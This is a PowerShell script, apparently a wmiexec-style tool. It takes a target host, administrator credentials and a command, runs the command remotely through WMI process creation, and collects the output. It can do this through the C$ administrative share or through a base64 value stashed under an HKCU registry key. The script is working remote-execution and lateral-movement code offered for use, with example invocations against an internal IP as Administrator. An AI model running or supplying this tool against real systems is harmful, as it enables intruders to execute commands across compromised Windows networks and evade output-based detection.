$tmppath="\Windows\Temp\outx.txt"
$endid="RaidEnMei"

function Exec{
	param([string]$host_,[string]$username,[string]$password,[string]$cmdLine,[string]$type)
	$command="";
	if($type -eq "SMB"){
		$command="cmd.exe /c $cmdLine > $tmppath || echo $endid >> $tmppath";
	}elseif($type -eq "REG"){
		$command=-join("powershell",' $fileContent = ',"$cmdLine;",'$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent);','$encodedCommand = [Convert]::ToBase64String($bytes);','set-content ',"$tmppath",' $encodedCommand;$data=get-content ',"$tmppath",';New-Item -itemType String HKCU:\Test -value "$data" -Force');
	}
	write-host $command
	write-host "[*] Run Command:$cmdLine"
	[System.Management.ConnectionOptions] $connOps = New-Object -TypeName System.Management.ConnectionOptions;
	$connOps.Username = $username;  
	$connOps.Password = $password;  
	[System.Management.ManagementScope] $scope = New-Object -TypeName System.Management.ManagementScope "//$host_/root/cimv2", $connOps;
	[System.Management.ManagementPath] $path = New-Object -TypeName System.Management.ManagementPath "Win32_Process";
	[System.Management.ManagementClass] $mgmtClass = New-Object -TypeName System.Management.ManagementClass $scope, $path, $null;
	[System.Management.ManagementBaseObject] $inParams = $mgmtClass.GetMethodParameters("Create");
	$inParams["CommandLine"] = $command;
	$jg=[System.Management.ManagementBaseObject] $ret = $mgmtClass.InvokeMethod("Create", $inParams, $null);
	$errCode = [System.Convert]::ToUInt32($ret["ReturnValue"]);
	if($errCode -ne 0){
		write-host "Run Execute Error Code:$errCode"
		exit
	}else{
		write-host "[*] PID:"$jg.ProcessId
	}
}

function RegGet{
	param([string]$host_,[string]$username,[string]$password)
	write-host "[*] Read RegPath,Get Data"
	$regpath="Test"
	[System.Management.ConnectionOptions] $connOps = New-Object -TypeName System.Management.ConnectionOptions;
	$connOps.Username = $username;  
	$connOps.Password = $password;  
	[System.Management.ManagementScope] $scope = New-Object -TypeName System.Management.ManagementScope "//$host_/root/cimv2", $connOps;
	[System.Management.ManagementPath] $path = New-Object -TypeName System.Management.ManagementPath "StdRegProv";
	[System.Management.ManagementClass] $mgmtClass = New-Object -TypeName System.Management.ManagementClass $scope, $path, $null;
	[System.Management.ManagementBaseObject] $inParams = $mgmtClass.GetMethodParameters("GetStringValue");
	$inParams["hDefKey"] = 2147483649;
	$inParams["sSubKeyName"] = $regpath;
	$inParams["sValueName"] = "";
	$jg=[System.Management.ManagementBaseObject] $ret = $mgmtClass.InvokeMethod("GetStringValue", $inParams, $null);
	$errCode = [System.Convert]::ToUInt32($ret["ReturnValue"]);
	$value=$ret.sValue
	if($value -ne $null){
		$text=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($value));
		write-host $text;
	}
}

function Main{
	param([string]$host_,[string]$username,[string]$password,[string]$cmd,[string]$type)
	write-host "Host:"$host_" UserName:"$username" Password:"$password
	write-host "Run Mode:"$type
	if($type -eq "SMB"){
		$path=-join("\\",$host_,"\C$")
		$netuse=-join("net use ",$path,' "',$password,'" ',"/user:",$username)
		$out=cmd /c $netuse | Out-Null
		if($? -eq $true){
			write-host "[*] Smb Connect Sucess"
			$newfile=New-Item -Path $path -Name $tmppath -ItemType "file" -Force | Out-Null
			if($? -eq $true){
				write-host "[*] Smb Share File Create Ok"
				Exec -host $host_ -username $username -password $password -cmdLine $cmd -type $type
				$filename=-join($path,$tmppath)
				#powershell读取文件总是读空，只能用这种方式来读直到有结果
				while(1){
					$fdata=Get-Content $filename
					if ($fdata -ne $endid -and $fdata.Length -gt 0){
						$fdata -replace $endid,""
						break
					}
					
					if($fdata -eq $endid){
						break
					}
				}
			}
		}else{
			write-host "[-] Smb Connect Failure"
		}
	}elseif($type -eq "reg"){
		try{
			Exec -host $host_ -username $username -password $password -cmdLine $cmd -type $type
		}catch{
			write-host "[-] Connect RPC Failure,exit......"
			exit
		}
		
		try{
			RegGet -host $host_ -username $username -password $password
		}catch{
				write-host "[-] read RegPath Failure,exit......"
				exit
		}
	}elseif($type -eq "read"){
		write-host "[*] Reread the diary"
		RegGet -host $host_ -username $username -password $password
	}
}

$host_=$args[0]
$username=$args[1]
$password=$args[2]
$cmd=$args[3]
$type=$args[4]
if($args.Length -eq 5){
	Main -host $host_ -username $username -password $password -cmd $cmd -type $type
}else{
	write-host "wmiexec.ps1 192.168.1.2 Administrator ABC123456 whoami smb - SMB Read Command"
	write-host "wmiexec.ps1 192.168.1.2 Administrator ABC123456 whoami reg - Reg Read Command"
	write-host "wmiexec.ps1 192.168.1.2 Administrator ABC123456 whoami read - Reread the diary"
}